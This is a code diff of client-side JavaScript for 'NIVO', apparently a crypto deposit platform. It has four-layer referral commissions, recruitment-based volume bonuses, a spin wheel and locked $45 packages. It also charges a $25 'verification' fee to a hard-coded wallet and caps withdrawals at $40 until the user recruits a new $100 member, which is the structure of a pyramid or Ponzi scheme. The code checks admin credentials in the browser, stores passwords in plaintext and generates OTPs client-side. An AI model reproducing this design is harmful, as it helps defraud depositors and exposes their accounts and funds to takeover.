+      if(!cloud||!cloud.user)return;
+      var key="nivo_"+row.user_name,local=null;
+      try{local=JSON.parse(localStorage.getItem(key)||"null")}catch(e){}
+      if(!local){localStorage.setItem(key,JSON.stringify(cloud));return}
+      local.wds=cloud.wds||[];
+      local.deps=cloud.deps||local.deps||[];
+      local.verify=cloud.verify||null;
+      local.verified=!!cloud.verified;
+      local.bal=+cloud.bal||0;
+      local.lock=+cloud.lock||0;
+      local.profit=+cloud.profit||0;
+      local.todayN=+cloud.todayN||0;
+      local.todayD=cloud.todayD||local.todayD||"";
+      if(cloud.ref)local.ref=cloud.ref;
+      if(cloud.level)local.level=cloud.level;
+      local.rewardInc=+cloud.rewardInc||0;
+      local.teamInc=+cloud.teamInc||0;
+      local.diamondInc=+cloud.diamondInc||0;
+      if((+cloud.nextSpin||0)>(+local.nextSpin||0)){
+        local.nextSpin=cloud.nextSpin;
+        local.spins=cloud.spins;
+        local.spinGot=cloud.spinGot;
+        local.spinDay=cloud.spinDay;
+      }
+      localStorage.setItem(key,JSON.stringify(local));
+    });
+    if(u&&u.user){var nu=load(u.user);if(nu)u=nu;}
+    if(done)done();
+  }).catch(function(){if(done)done();});
+}  
+var SLICES=[{l:"1.02x",m:1.02,c:"#1a73e8"},{l:"1.04x",m:1.04,c:"#071428"},{l:"1.06x",m:1.06,c:"#3b82f6"},{l:"1.08x",m:1.08,c:"#071428"},{l:"1.10x",m:1.10,c:"#1a73e8"},{l:"No win",m:0,c:"#64748b"}];
+var SLABS=[
+  {n:1,name:"First",need:45,dir:0,down:0,tot:0},
+  {n:2,name:"Second",need:200,dir:18,down:17,tot:35},
+  {n:3,name:"Third",need:500,dir:30,down:65,tot:95},
+  {n:4,name:"Fourth",need:1000,dir:50,down:175,tot:225},
+  {n:5,name:"Fifth",need:2000,dir:50,down:500,tot:550}
+];
+function slabNow(){
+  if(!u)return SLABS[0];
+  var L=layers(),A=L.A||L[0]||[],B=L.B||L[1]||[],C=L.C||L[2]||[];
+  var dir=A.length,down=B.length+C.length,tot=dir+down;
+  var wal=Number(u.bal||u.wallet||0),cur=SLABS[0];
+  SLABS.forEach(function(s){
+    if(wal>=s.need&&dir>=s.dir&&down>=s.down&&tot>=s.tot)cur=s;
+  });
+  cur.dirHave=dir;cur.downHave=down;cur.totHave=tot;cur.wal=wal;
+  return cur;
+}
+function slabHtml(){
+  var wal=Number((u&&(u.bal||u.lock))||0);
+  var rows=SLABS.map(function(s){
+    var on=wal>=s.need;
+    return '<div style="display:flex;justify-content:space-between;padding:10px 0;border-top:1px solid #e8eef6"><span>Slab '+s.n+' · '+s.name+' · $'+s.need+'</span><span style="font-size:11px;font-weight:700;color:'+(on?"#15803d":"#94a3b8")+'">'+(on?"ACTIVE":"LOCKED")+'</span></div>';
+  }).join("");
+  var cur=SLABS.filter(function(s){return wal>=s.need;});
+  cur=cur.length?cur[cur.length-1]:SLABS[0];
+  return '<div class="card" style="margin:10px 0;padding:12px;border-radius:14px"><div style="font-weight:700;margin-bottom:8px">Account slab · '+cur.name+' · $'+cur.need+'</div>'+rows+"</div>";
+}
+var u=null, pending=null, otpCode="", otpAt=0, gzLive=false;
+if(EJ_PUB) try{emailjs.init({publicKey:EJ_PUB})}catch(e){}
+function el(id){return document.getElementById(id)}
+function togPw(id,btn){
+  var i=el(id);if(!i)return;
+  var on=i.type==="password";
+  i.type=on?"text":"password";
+  btn.style.opacity=on?"1":".55";
+}
+function saveU(obj){localStorage.setItem("nivo_"+obj.user, JSON.stringify(obj)); if(u&&u.user===obj.user) u=obj; pushCloud(obj);}
+  function sendTicket(){
+  if(!u)return;
+  var msg=(el("sup-msg").value||"").trim();
+  if(!msg){pop("Required","Write a message");return}
+  u.tickets=u.tickets||[];
+  u.tickets.push({id:Date.now(),msg:msg,at:new Date().toISOString(),reply:"",st:"PENDING"});
+  saveU(u);
+  el("sup-msg").value="";
+  showTickets();
+  pop("Sent","Support ticket sent to admin");
+}
+function showTickets(){
+  var box=el("sup-list"); if(!box||!u)return;
+  var list=(u.tickets||[]).slice().reverse();
+  box.innerHTML=list.map(function(t){
+    return "<div class='border-b border-white/10 py-2'><b>You:</b> "+t.msg+"<br><b>Admin:</b> "+(t.reply||"Pending")+"</div>";
+  }).join("")||"No tickets yet";
+  if((u.tickets||[]).some(function(t){return t.reply;})){
+  setTimeout(function(){
+    u.tickets=[];
+    saveU(u);
+    if(el("sup-list"))el("sup-list").innerHTML="No tickets yet";
+  },60000);
+}
+}
+  var _adT=0;
+function adTap(){_adT++;if(_adT>=5){_adT=0;showBox("box-admin");el("auth").classList.remove("hidden");}}
+  function dayKey(){var t=new Date(Date.now()+19800000);return t.toISOString().slice(0,10)}
+function bumpToday(p,n){if(!p||!(n>0))return;if(p.todayD!==dayKey()){p.todayD=dayKey();p.todayN=0}p.todayN=(+p.todayN||0)+n;}
+  function payTeam(fromU,amt){if(!fromU||!(amt>0))return;var rates={2:{A:.12,B:.10,C:.08,D:.06},3:{A:.13,B:.11,C:.09,D:.07},4:{A:.15,B:.13,C:.10,D:.08},5:{A:.18,B:.15,C:.12,D:.10}};var keys=["A","B","C","D"],p=fromU,i;for(i=0;i<4;i++){if(!p||!p.sponsor)break;var up=allUsers().filter(function(x){return String(x.ref||"").toUpperCase()===String(p.sponsor).toUpperCase()})[0];if(!up)break;var lv=Number(up.level||0);if(lv>=2&&rates[Math.min(lv,5)]){var cut=+(amt*rates[Math.min(lv,5)][keys[i]]).toFixed(2);if(cut>0){up.profit=(+up.profit||0)+cut;up.bal=(+up.bal||0)+cut;up.teamInc=(+up.teamInc||0)+cut;if(typeof bumpToday==="function")bumpToday(up,cut);saveU(up);}}p=up;}}
+function load(name){try{return JSON.parse(localStorage.getItem("nivo_"+name)||"null")}catch(e){return null}}
+function allUsers(){
+  var out=[];
+  for(var i=0;i<localStorage.length;i++){
+    var k=localStorage.key(i);
+    if(!k||k.indexOf("nivo_")!==0||k==="nivo_ref")continue;
+    try{
+      var x=JSON.parse(localStorage.getItem(k));
+      if(x&&x.user)out.push(x);
+    }catch(e){}
+  }
+  return out;
+}
+function pop(t,m){el("pop-t").textContent=t;el("pop-m").textContent=m||"";el("pop").classList.remove("hidden")}
+function closePop(){el("pop").classList.add("hidden");if(el("pop-spin"))el("pop-spin").classList.add("hidden")}
+function money(n){return Number(n||0).toFixed(2)}
+function codeOf(){var c="NIVO23456789ABCDEFGHJKMNPQRSTUVWXYZ",s="";for(var i=0;i<8;i++)s+=c.charAt(Math.floor(Math.random()*c.length));return s;}
+function showBox(id){
+  ["box-login","box-signup","box-forgot","box-otp","box-admin"].forEach(function(x){var e=el(x);if(e)e.classList.add("hidden");});
+  var b=el(id);if(b)b.classList.remove("hidden");
+  if(id==="box-signup"){
+    var r=(new URLSearchParams(location.search).get("ref")||localStorage.getItem("nivo_ref")||"").trim();
+    if(r&&el("su-ref"))el("su-ref").value=r;
+  }
+}
+function hideAll(){el("auth").classList.add("hidden");el("app").classList.add("hidden");el("admin").classList.add("hidden")}
+function kidsOf(ref){return allUsers().filter(function(p){return String(p.sponsor||"").toUpperCase()===String(ref||"").toUpperCase()})}
+var VOL=[
+  {need:5000,pay:250,name:"First"},
+  {need:12000,pay:500,name:"Second"},
+  {need:22000,pay:1200,name:"Third"},
+  {need:35000,pay:2200,name:"Fourth"},
+  {need:48000,pay:4200,name:"Fifth"},
+  {need:75000,pay:8000,name:"Sixth"},
+  {need:110000,pay:12000,name:"Seventh"},
+  {need:160000,pay:25000,name:"Eighth"}
+];
+function layersFor(ref){var A=kidsOf(ref);var B=[];A.forEach(function(a){B=B.concat(kidsOf(a.ref))});var C=[];B.forEach(function(b){C=C.concat(kidsOf(b.ref))});var D=[];C.forEach(function(c){D=D.concat(kidsOf(c.ref))});return {A:A,B:B,C:C,D:D};}
+function layers(){return layersFor(u&&u.ref);}
+function abcdBiz(ref){
+  var L=layersFor(ref),n=0;
+L.A.concat(L.B,L.C,L.D).forEach(function(p){
+  var d=(p.deps||[]).filter(function(x){return x.st==="SUCCESSFUL";})[0];
+  n+=d?Number(d.amt||0):0;
+});
+  return +n.toFixed(2);
+}
+function applyVol(p,silent){
+  if(!p||!p.ref)return 0;
+  var biz=abcdBiz(p.ref);
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/volume",{
+    method:"POST",
+    headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+    body:JSON.stringify({user:p.user,biz:biz})
+  }).then(function(r){return r.json()}).then(function(d){
+    if(!d||!d.added)return;
+    p.bal=d.bal;p.profit=d.profit;
+    if(u&&u.user===p.user){u.bal=d.bal;u.profit=d.profit;if(el("h-bal"))el("h-bal").textContent=money(d.bal);if(!silent)pop("Volume Bonus","$"+money(d.added)+" added");}
+  }).catch(function(){});
+  return 0;
+}
+function paintVol(){
+  if(!u||!el("vol-lines"))return;
+  var biz=abcdBiz(u.ref);
+  el("vol-biz").textContent=money(biz);
+  el("vol-got").textContent=money(u.volInc||0);
+  var next=null;
+  el("vol-lines").innerHTML=VOL.map(function(s,i){
+    var done=(u.volPaid||[]).indexOf(i)>=0||biz>=s.need;
+    if(!done&&!next)next=s;
+    var pct=Math.max(0,Math.min(100,biz/s.need*100));
+    var tag=done?"Achieved · $"+s.pay+" received":(next===s?"Next bonus · $"+s.pay:"Locked · $"+s.pay);
+    var left=done?"":" · $"+(Math.max(0,s.need-biz)).toFixed(0)+" left";
+    return '<div style="margin:10px 0 0"><div style="display:flex;justify-content:space-between;font-size:12px;font-weight:700"><span>'+s.name+' · $'+s.pay+'</span><span>'+tag+'</span></div><div style="font-size:11px;color:#bfdbfe">ABCD business $'+s.need+left+'</div><div style="height:8px;border-radius:99px;background:#1e3a5f;margin-top:4px;overflow:hidden"><div style="height:100%;width:'+pct+'%;background:'+(done?"#16a34a":"#d97706")+'"></div></div></div>';
+  }).join("");
+}
+function doLogin(){
+  var name=el("li-user").value.trim(),pass=el("li-pass").value;
+  if(!name||!pass){pop("Required","Enter username and password");return}
+  if(name===ADMIN_ID&&pass===ADMIN_PW){el("ad-user").value=name;el("ad-pass").value=pass;adminLogin();return;}
+  var waited=false;
+  var timer=setTimeout(function(){waited=true;finish();},2500);
+  function finish(){
+    u=load(name);
+    if(!u||u.pass!==pass){pop("Error","Wrong username or password");return}
+    enterUser();
+    pop("Welcome",name);
+  }
+  pullCloud(function(){if(!waited){waited=true;clearTimeout(timer);finish();}});
+}
+function sendFg(){
+  var name=el("fg-user").value.trim(),email=el("fg-email").value.trim();
+  if(!name||!email){pop("Required","Username and email");return}
+  function go(){
+    var p=load(name);
+    if(!p||String(p.email||"").toLowerCase()!==email.toLowerCase()){pop("Not found","Username and email do not match");return}
+    otpCode=String(Math.floor(100000+Math.random()*900000));
+    otpAt=Date.now();
+    pending={user:name,email:email,mode:"fg"};
+    el("fg-step2").classList.remove("hidden");
+    if(!(EJ_PUB&&EJ_SVC&&EJ_TPL)){pop("OTP","Test code: "+otpCode);return}
+    emailjs.send(EJ_SVC,EJ_TPL,{email:email,to_email:email,name:name,user_name:name,otp_code:otpCode,message:"NIVO reset OTP "+otpCode}).then(function(){pop("OTP","Code sent to email")}).catch(function(){pop("Email failed","Check EmailJS template / To email")});
+    }
+  if(typeof pullCloud==="function")pullCloud(go);else go();
+}
+function okFg(){if(!pending||pending.mode!=="fg"){pop("Error","Send OTP first");return}if(Date.now()-otpAt>600000){pop("Expired","Send again");return}if(el("fg-otp").value.trim()!==otpCode){pop("Wrong","OTP incorrect");return}var np=el("fg-pass").value;if(!np||np.length<4){pop("Password","Min 4 letters");return}var p=load(pending.user);p.pass=np;saveU(p);pending=null;pop("Done","Password updated. Sign in.");showBox("box-login");}
+function sendOtp(){
+  var name=el("su-user").value.trim(),email=el("su-email").value.trim(),phone=(el("su-phone")&&el("su-phone").value||"").trim(),pass=el("su-pass").value,ref=(el("su-ref")&&el("su-ref").value||"").trim().toUpperCase();
+  if(!name||!email||!phone||!pass){pop("Required","Username, email, phone, password");return}
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){pop("Email","Enter a valid email like name@gmail.com");return}
+  if(load(name)){pop("Error","Username taken");return}
+  otpCode=String(Math.floor(100000+Math.random()*900000));otpAt=Date.now();
+  pending={user:name,email:email,phone:phone,pass:pass,ref:codeOf(),sponsor:ref||(new URLSearchParams(location.search).get("ref")||"")};
+  if(el("otp-hint"))el("otp-hint").textContent="Enter the code sent to "+email;
+  showBox("box-otp");
+  if(EJ_PUB&&EJ_SVC&&EJ_TPL){
+    emailjs.send(EJ_SVC,EJ_TPL,{email:email,to_email:email,name:name,user_name:name,otp_code:otpCode,message:"NIVO OTP "+otpCode})
+      .then(function(){pop("OTP sent","Check your email inbox")})
+      .catch(function(){pop("Email failed","Mail not sent. Enter a correct email and try again");});
+  } else {
+    pop("Email failed","Mail service not ready. Enter a correct email and try again");
+  }
+}
+function verifyOtp(){
+  if(!pending){pop("Error","Start signup again");return}
+  if(Date.now()-otpAt>600000){pop("Expired","Resend OTP");return}
+  if(el("su-otp").value.trim()!==otpCode){pop("Wrong OTP","Check the 6-digit code");return}
+  u={user:pending.user,email:pending.email,pass:pending.pass,ref:pending.ref,sponsor:pending.sponsor,bal:0,profit:0,lock:0,spins:0,level:1,addr:"",deps:[],wds:[],teamA:[],gifts:0,paidLevels:[],verified:true,skipVerify:true};
+  saveU(u); pending=null; enterUser();
+}
+function adminLogin(){
+  if(el("ad-user").value.trim()!==ADMIN_ID||el("ad-pass").value!==ADMIN_PW){pop("Denied","Wrong admin login");return}
+  hideAll();el("admin").classList.remove("hidden");
+  function go(){try{renderAdmin();}catch(e){}}
+  go();
+  if(typeof pullCloud==="function")pullCloud(go);
+}
+function logout(){u=null;localStorage.removeItem("nivo_session");hideAll();el("auth").classList.remove("hidden");showBox("box-login")}
+function enterUser(){
+  if(!u||!u.user){pop("Login","Open Sign in");showBox("box-login");return}
+  pullCloud(function(){
+    var nu=load(u.user);if(nu)u=nu;
+    if(!u||!u.user){pop("Error","Login again");return}
+    localStorage.setItem("nivo_session",u.user);
+    hideAll();el("app").classList.remove("hidden");
+    if(el("h-name"))el("h-name").textContent=u.user;
+    if(el("h-bal"))el("h-bal").textContent=money(u.bal);
+    drawWheel();draw();tab("home");
+    if(!u.verified && !u.skipVerify)setTimeout(showVerify,900);
+    if(u.verified&&u.verify&&!localStorage.getItem("vseen2_"+u.user)){
+  localStorage.setItem("vseen2_"+u.user,"1");
+  setTimeout(function(){pop("Verified","Your account is verified. Spin and withdraw are now open.");},1600);
+}
+    
+  });
+}
+function tab(id){["home","wallet","income","volume","deposit","withdraw","spin","game","team","profile","support"].forEach(function(t){if(el("tab-"+t))el("tab-"+t).classList.toggle("hidden",t!==id)});document.querySelectorAll(".side-btn[data-tab]").forEach(function(b){b.classList.toggle("on",b.getAttribute("data-tab")===id)});if(id==="game"){try{var ctx=window.AudioContext||window.webkitAudioContext;var a=new ctx(),o=a.createOscillator(),g=a.createGain();o.type="triangle";o.frequency.value=523;g.gain.value=0.12;o.connect(g);g.connect(a.destination);o.start();setTimeout(function(){o.frequency.value=784},120);setTimeout(function(){o.stop();a.close()},350);}catch(e){}}draw();}
+  var _tab=tab;
+tab=function(id){
+  _tab(id);
+  if(id==="support")showTickets();
+  if(id==="spin"&&u&&el("sp-next")&&u.nextSpin){
+    if(window._spinClk)clearInterval(window._spinClk);
+    window._spinClk=setInterval(function(){
+      if(!el("sp-next")||!u||!u.nextSpin)return;
+      var s=Math.max(0,Math.ceil((u.nextSpin-Date.now())/1000));
+      el("sp-next").textContent="Next spin in "+Math.floor(s/3600)+"h "+Math.floor((s%3600)/60)+"m "+(s%60)+"s";
+    },200);
+  }
+};
+  function showVerify(){
+  if(!u||u.verified)return;
+  if(el("vf-user"))el("vf-user").value=u.user||"";
+  el("verify-box").classList.remove("hidden");
+}
+  function copyFee(b){
+  var t="0x59552E67B1a30Ee520C8B0701dA22bf398d0D0AE";
+  function done(ok){b.textContent=ok?"Copied":"Hold address to copy";}
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(t).then(function(){done(true)}).catch(function(){done(false)});
+    return;
+  }
+  var i=document.createElement("textarea");
+  i.value=t;i.readOnly=true;i.style.position="fixed";i.style.left="-9999px";
+  document.body.appendChild(i);i.select();
+  var ok=false;try{ok=document.execCommand("copy")}catch(e){}
+  document.body.removeChild(i);done(ok);
+}
+function submitVerify(){
+  var hash=el("vf-hash").value.trim();
+  if(!hash){pop("Hash","Paste the TX hash");return}
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/verify",{
+    method:"POST",
+    headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+    body:JSON.stringify({user:u.user,hash:hash})
+  }).then(function(r){return r.json()}).then(function(d){
+    if(!d||d.error){pop("Verify",d&&d.error||"not saved");return}
+    u.verify={hash:hash,st:"PENDING"};
+    pop("Submitted","Waiting for admin approval");
+    el("verify-box").classList.add("hidden");
+  }).catch(function(){pop("Verify","not saved");});
+}
+function copyCode(){if(!u||!u.ref)return;navigator.clipboard.writeText(u.ref);pop("Copied","Referral code copied.");}
+function copyAddr(){navigator.clipboard.writeText(ADDR).then(function(){el("copy-ok").classList.remove("hidden");pop("Copied","Address copied.")})}
+  function payNow(){
+  if(!u){pop("Login","Sign in first");return;}
+  var amt=Number(el("dep-amt").value);
+  if(!amt||amt<45){pop("Minimum","Enter amount $45 or more");return;}
+  pop("Opening","Payment page…");
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/nowpay",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({user:u.user,amt:amt})
+  }).then(function(r){return r.json();}).then(function(j){
+    if(j.url)location.href=j.url;
+    else pop("Not ready","Payment page did not open");
+  }).catch(function(){pop("Not ready","Try again");});
+}
+function sendDep(){
+  if(!u){pop("Login","Sign in first");return;}
+  var box=el("dep-hash");
+  if(!box){pop("Refresh","Close site and open again");return;}
+  var amt=Number(el("dep-amt").value),hash=(box.value||"").trim();
+  if(!amt||amt<45){pop("Minimum","Enter amount $45 or more");return;}
+  if(!/^0x[0-9a-fA-F]{64}$/.test(hash)){pop("TX hash","Paste full BEP20 hash");return;}
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/deposit",{
+    method:"POST",
+    headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+    body:JSON.stringify({user:u.user,amount:amt,hash:hash,sponsor:u.sponsor||""})
+  }).then(function(r){return r.json()}).then(function(d){
+    if(!d||d.error){pop("Deposit",d&&d.error||"not saved");return}
+    u.deps=u.deps||[];
+    u.deps.unshift({id:hash,amt:amt,st:"PENDING",t:Date.now()});
+    saveU(u);
+    pop("Pending","Deposit $"+amt+" submitted. Waiting for admin approval.");
+    draw();
+  }).catch(function(){pop("Deposit","not saved");});
+}
+var addrEdit=false;
+function saveAddr(){
+  var a=(el("wd-addr")&&el("wd-addr").value||"").trim();
+  if(!a||a.indexOf("0x")!==0||a.length<20){pop("Address","Enter valid BEP20 0x address");return;}
+  u.addr=a;saveU(u);addrEdit=false;
+  if(el("wd-addr"))el("wd-addr").disabled=true;
+  if(el("wd-saved"))el("wd-saved").textContent="Saved";
+  pop("Saved","Address locked. Edit to change.");
+}
+function editAddr(){
+  if(!u)return;
+  addrEdit=true;
+  if(el("wd-addr")){el("wd-addr").disabled=false;el("wd-addr").focus();}
+  pop("Edit","Change then press Save");
+}
+var wdOtp="", wdOtpAt=0;
+function sendWdOtp(){
+  if(!u||!u.email){pop("Email","Login email missing");return;}
+  if((u.wds||[]).some(function(x){return x.st==="PENDING";})){pop("Wait","One withdraw pending");return;}
+    if(wdOtp&&Date.now()-wdOtpAt<60000){
+    var s=Math.ceil((60000-(Date.now()-wdOtpAt))/1000);
+    pop("Wait","Next OTP in "+s+"s");return;
+  }
+  wdOtp=String(Math.floor(100000+Math.random()*900000));
+  wdOtpAt=Date.now();
+    var b=el("wd-otp-btn");
+  if(window._wdOtpClk)clearInterval(window._wdOtpClk);
+  window._wdOtpClk=setInterval(function(){
+    var left=60000-(Date.now()-wdOtpAt);
+    if(!b)return;
+    if(left<=0){clearInterval(window._wdOtpClk);b.textContent="Send OTP";b.disabled=false;return;}
+    b.disabled=true;
+    b.textContent=Math.ceil(left/1000)+"s";
+  },250);
+  if(!(EJ_PUB&&EJ_SVC&&EJ_TPL)){pop("OTP",wdOtp+" (mail off)");return;}
+  emailjs.send(EJ_SVC,EJ_TPL,{
+    email:u.email,to_email:u.email,user_name:u.user,
+    otp_code:wdOtp,message:"NIVO withdraw OTP "+wdOtp
+  }).then(function(){pop("OTP sent","Check your email. OTP is valid for 5 minutes.");})
+    .catch(function(){pop("Email failed","OTP not sent");});
+  }
+function askWd(){
+  if(!u||!u.verified){showVerify();return}
+  if(!u.addr){pop("Address","Save address first");return;}
+        if(!wdOtp||Date.now()-wdOtpAt>300000){pop("OTP","OTP expired. Send again");return;}  
+    if(!el("wd-otp")||el("wd-otp").value.trim()!==String(wdOtp)){pop("OTP","Wrong or expired OTP");return;}
+    wdOtp="";wdOtpAt=0;
+  if((u.wds||[]).some(function(x){return x.st==="PENDING";})){pop("Wait","One withdraw already pending");return;}
+  var amt=Number(el("wd-amt").value);
+  if(!amt||amt<10){pop("Minimum","Withdraw minimum $10");return;}
+  if(u.verify&&amt>40){
+  var vt=Number(u.verify.t||0);
+  var open=(allUsers()||[]).some(function(x){
+    if(String(x.sponsor||"").toUpperCase()!==String(u.ref||"").toUpperCase())return false;
+    var f=(x.deps||[]).filter(function(d){return d.st==="SUCCESSFUL";})[0];
+    return f&&Number(f.amt)>=100&&Number(f.t||0)>vt;
+  });
+  if(!open){pop("Limit","Maximum $40. One new $100 direct joining after verification removes this limit.");return;}
+}
+  var locked=Math.max(45, Number(u.lock||0));
+  var maxW=Math.min(Number(u.profit||0), Number(u.bal||0)-locked);
+  if(amt>maxW+0.0001){
+    pop("Locked","Package $"+locked+" stays locked. You can withdraw $"+money(Math.max(0,maxW)));
+    return;
+  }
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/withdraw",{
+  method:"POST",
+  headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+  body:JSON.stringify({user:u.user,amount:amt,address:u.addr})
+  }).then(function(r){return r.json()}).then(function(d){
+  if(!d||d.error){pop("Withdraw",d&&d.error?d.error:"Could not submit. Try again.");return}
+  pop("Pending","Withdraw request $"+money(amt)+" submitted. Payment will be sent within 24 hours after admin approval.");
+  setTimeout(function(){pullCloud(function(){var nu=load(u.user);if(nu)u=nu;draw();});},1000);
+}).catch(function(e){pop("Withdraw",e&&e.message?e.message:"Could not submit. Try again.");});
+    return;
+}
+function undoWd(user,id){
+  var p=findUser(user);if(!p)return;
+  var d=(p.wds||[]).filter(function(x){return x.id===id})[0];
+  if(!d)return;
+  if(d.st!=="APPROVED"&&d.st!=="SUCCESSFUL")return;
+  d.st="PENDING";
+  saveU(p);
+  renderAdmin();
+  pop("Back to pending",user+" · $"+money(d.amt));
+}
+function findUser(name){return allUsers().filter(function(x){return x.user===name})[0]}
+function adDep(user,id,ok,amt){
+  function done(){
+    fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/approve",{
+      method:"POST",
+      headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+      body:JSON.stringify({admin:ADMIN_ID,pass:ADMIN_PW,user:user,id:id,ok:ok,kind:"deposit"})
+    }).then(function(r){return r.json()}).then(function(d){
+      if(!d||d.error){pop("Admin",d&&d.error||"not saved");return}
+      pop(ok?"Approved":"Rejected",user);
+      pullCloud(function(){renderAdmin();});
+    }).catch(function(){pop("Admin","not saved");});
+  }
+  if(!ok){done();return}
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/deposit",{
+    method:"POST",
+    headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+    body:JSON.stringify({user:user,amount:amt||45,hash:id})
+  }).then(function(){done()}).catch(function(){done()});
+}
+  function maskName(n){n=String(n||"");if(n.length<3)return n[0]+"***";return n[0]+"****"+n.slice(-2);}
+function isOn(p){if(Number(p.bal||0)<45&&!(p.deps||[]).some(function(d){return d.st==="SUCCESSFUL";}))return false;return Number(p.lock||0)>=45;}
+function showCom(layer){
+  var L=layers(),box=el("com-box");if(!box)return;
+  box.classList.remove("hidden");
+  var k=layer||"A";
+  var tabs=["A","B","C","D"].map(function(x){
+        var on=x===k;
+    return '<button onclick="showCom(\''+x+'\')" style="border:0;border-radius:20px;padding:8px 14px;margin:0 6px 10px 0;font-size:12px;font-weight:600;background:'+(on?'#2563eb':'#eef2ff')+';color:'+(on?'#fff':'#1e3a8a')+'">'+x+' team</button>';
+  }).join("");
+  var rows=(L[k]||[]).map(function(p){
+    return "<tr class='border-b'><td class='py-2 pr-2'>"+p.user+"</td><td>"+(isOn(p)?"Active":"Inactive")+"</td><td class='break-all'>"+(p.ref||"—")+"</td></tr>";
+  }).join("")||"<tr><td class='py-3' colspan='3'>No "+k+" members</td></tr>";
+  box.innerHTML=tabs+"<div class='font-bold mb-2'>"+k+" team</div><table class='w-full text-sm'><thead><tr class='text-slate-500 text-left'><th class='py-1'>Name</th><th>Status</th><th>Code</th></tr></thead><tbody>"+rows+"</tbody></table>";
+}
+function adWd(user,id,ok){
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/approve",{
+    method:"POST",
+    headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+    body:JSON.stringify({admin:ADMIN_ID,pass:ADMIN_PW,user:user,id:id,ok:ok,kind:"withdraw"})
+  }).then(function(r){return r.json()}).then(function(d){
+    if(!d||d.error){pop("Admin",d&&d.error||"not saved");return}
+    pop(ok?"Approved":"Rejected",user);
+    pullCloud(function(){renderAdmin();});
+  }).catch(function(){pop("Admin","not saved");});
+}
+  function adVf(user,ok){
+  fetch("https://adpubgmpuyqobsvftmou.supabase.co/functions/v1/approve",{
+    method:"POST",
+    headers:{"Content-Type":"application/json","apikey":SB_KEY,"Authorization":"Bearer "+SB_KEY},
+    body:JSON.stringify({admin:ADMIN_ID,pass:ADMIN_PW,user:user,id:"verify",ok:ok,kind:"verify"})
+  }).then(function(r){return r.json()}).then(function(d){
+    if(!d||d.error){pop("Admin",d&&d.error||"not saved");return}
+    pop(ok?"Verified":"Rejected",user);
+    pullCloud(function(){renderAdmin();});
+  }).catch(function(){pop("Admin","not saved");});
+}
+function renderAdmin(){
+  var list=allUsers(),pd=0,pw=0,depH="",wdH="",vfH="",mem="";
+  list.forEach(function(p){
+    if(p.verify&&p.verify.st==="PENDING"){
+  vfH+='<div class="py-3 border-b"><div class="font-bold">$25 · '+p.user+'</div><div class="text-xs break-all mt-1">'+(p.verify.hash||"—")+'</div><div class="mt-2"><button class="btn px-3 py-1 mr-1" onclick="adVf(\''+p.user+'\',true)">OK</button><button class="ghost rounded-lg px-3 py-1" onclick="adVf(\''+p.user+'\',false)">No</button></div></div>';
+}
+(p.deps||[]).forEach(function(d){
+  var hid=d.file||d.id;
+  if(d.st==="PENDING"){
+    pd++;
+    depH+='<div class="py-3 border-b"><div class="font-bold">$'+money(d.amt)+' · '+p.user+'</div><div class="text-xs break-all mt-1">'+hid+'</div><div class="mt-2"><button class="btn px-3 py-1 mr-1" onclick="adDep(\''+p.user+'\',\''+hid+'\',true,'+d.amt+')">OK</button><button class="ghost rounded-lg px-3 py-1" onclick="adDep(\''+p.user+'\',\''+hid+'\',false)">No</button></div></div>';
+  }else{
+    depH+='<div class="py-2 border-b text-sm"><b>'+d.st+'</b> $'+money(d.amt)+' · '+p.user+'</div>';
+  }
+});
+     (p.wds||[]).forEach(function(d){
+      var a=d.addr||p.addr||"—";
+      if(d.st==="PENDING"){
+        pw++;
+        wdH+='<div class="py-3 border-b"><div class="font-bold">PENDING $'+money(d.amt)+' net · '+p.user+(d.fee?" · fee $"+money(d.fee):"")+'</div><div class="text-xs break-all mt-1 font-mono">'+a+'</div><button class="ghost rounded-lg px-3 py-1 mt-1 text-xs" onclick="navigator.clipboard.writeText(\''+a+'\').then(function(){pop(\'Copied\',\''+p.user+'\')})">Copy address</button><div class="mt-2"><button class="btn px-3 py-1 mr-1" onclick="adWd(\''+p.user+'\',\''+d.id+'\',true)">Paid OK</button><button class="ghost rounded-lg px-3 py-1" onclick="adWd(\''+p.user+'\',\''+d.id+'\',false)">No</button></div></div>';
+      } else {
+        wdH+='<div class="py-2 border-b text-sm"><b>'+d.st+'</b> $'+money(d.amt)+' · '+p.user+'<div class="text-xs break-all font-mono">'+a+'</div>'+(d.st==="APPROVED"||d.st==="SUCCESSFUL"?'<button class="ghost rounded-lg px-3 py-1 mt-1 text-xs" onclick="undoWd(\''+p.user+'\',\''+d.id+'\')">Undo → Pending</button>':'')+'</div>';
+      }
+    });
+    mem+="<tr><td>"+p.user+"</td><td>"+p.email+"</td><td>$"+money(p.bal)+"</td><td>L"+(p.level||0)+"</td><td class='text-xs break-all font-mono'>"+(p.addr||"—")+"</td></tr>";
+  });
+  
+  if(el("ad-vf"))el("ad-vf").innerHTML="<b>Verification $25</b><br>"+(vfH||"None");
+  
+el("ad-deps").innerHTML="<b>Deposits</b><br>"+(depH||"None");
+  el("ad-wds").innerHTML="<b>Pending withdrawals</b><br>"+(wdH||"None");
